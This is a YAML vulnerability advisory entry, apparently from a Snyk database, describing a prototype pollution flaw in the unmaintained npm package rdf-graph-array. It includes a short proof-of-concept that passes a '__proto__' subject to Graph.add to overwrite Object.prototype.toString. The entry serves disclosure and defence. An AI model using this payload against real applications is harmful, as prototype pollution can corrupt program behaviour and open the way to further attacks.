---
- id: snykio:npm:rdf-graph-array:551803
  title: Prototype Pollution
  description: |
    [rdf-graph-array][1] is a Graph implementation using arrays. Note: This
    package is no longer maintained.

    Affected versions of this package are vulnerable to Prototype Pollution.
    The `rdf.Graph.prototype.add` method could be tricked into adding or
    modifying properties of `Object.prototype` using a prototype payload.

    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}

        var Graph = require("rdf-graph-array").Graph;
        var g = new Graph();
        g.add({graph: "foo", subject: "__proto__", "predicate": "toString", "object": "JHU"});
        console.log({}.toString);



    [1]: https://www.npmjs.com/package/rdf-graph-array
